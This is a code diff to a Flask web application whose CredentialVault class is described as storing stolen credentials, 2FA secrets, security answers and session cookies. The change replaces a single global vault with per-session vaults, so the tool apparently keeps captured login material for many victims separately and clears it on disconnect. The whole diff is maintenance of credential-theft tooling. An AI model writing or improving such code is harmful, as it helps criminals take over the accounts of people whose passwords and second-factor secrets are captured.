@@ -20,6 +20,7 @@ import logging
 from flask_session import Session
 import redis as redis_lib
 from werkzeug.middleware.proxy_fix import ProxyFix
+from werkzeug.local import LocalProxy
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
@@ -126,24 +127,16 @@ class CredentialVault:
     Stores stolen credentials, 2FA secrets, and session cookies.
     Handles multi-step authentication automatically.
     """
-    _instance = None
-    _lock = threading.Lock()
-
-    def __new__(cls):
-        if cls._instance is None:
-            with cls._lock:
-                if cls._instance is None:
-                    cls._instance = super().__new__(cls)
-                    cls._instance.credentials = {}
-                    cls._instance.totp_info = {}  # Stores 2FA-related info
-                    cls._instance.security_info = {}  # Stores security question/answer
-                    cls._instance.session_cookies = {}
-                    cls._instance.active_session = None
-                    cls._instance.last_login = None
-                    cls._instance.auto_refresh_running = False
-                    cls._instance.auth_state = {}  # Tracks multi-step auth state
-                    cls._instance._new_session()
-        return cls._instance
+    def __init__(self):
+        self.credentials = {}
+        self.totp_info = {}  # Stores 2FA-related info
+        self.security_info = {}  # Stores security question/answer
+        self.session_cookies = {}
+        self.active_session = None
+        self.last_login = None
+        self.auto_refresh_running = False
+        self.auth_state = {}  # Tracks multi-step auth state
+        self._new_session()
 
     def _new_session(self):
         """Initialize a fresh requests session with SSL config"""
@@ -393,7 +386,33 @@ class CredentialVault:
         }
 
 
-vault = CredentialVault()
+_VAULTS: dict[str, CredentialVault] = {}
+_VAULTS_LOCK = threading.Lock()
+
+
+def _current_vault() -> CredentialVault:
+    vault_id = session.get('vault_id')
+    if not vault_id:
+        vault_id = secrets.token_urlsafe(16)
+        session['vault_id'] = vault_id
+
+    with _VAULTS_LOCK:
+        instance = _VAULTS.get(vault_id)
+        if instance is None:
+            instance = CredentialVault()
+            _VAULTS[vault_id] = instance
+        return instance
+
+
+def _drop_current_vault() -> None:
+    vault_id = session.pop('vault_id', None)
+    if not vault_id:
+        return
+    with _VAULTS_LOCK:
+        _VAULTS.pop(vault_id, None)
+
+
+vault = LocalProxy(lambda: _current_vault())
 
 def feature_enabled(f):
     @wraps(f)
@@ -535,6 +554,7 @@ def connect():
 def disconnect():
     """Clear stored credentials and all captured auth info"""
     vault.reset_auth(clear_credentials=True)
+    _drop_current_vault()
     session.pop('security_question', None)
     return redirect(url_for('connect'))
 
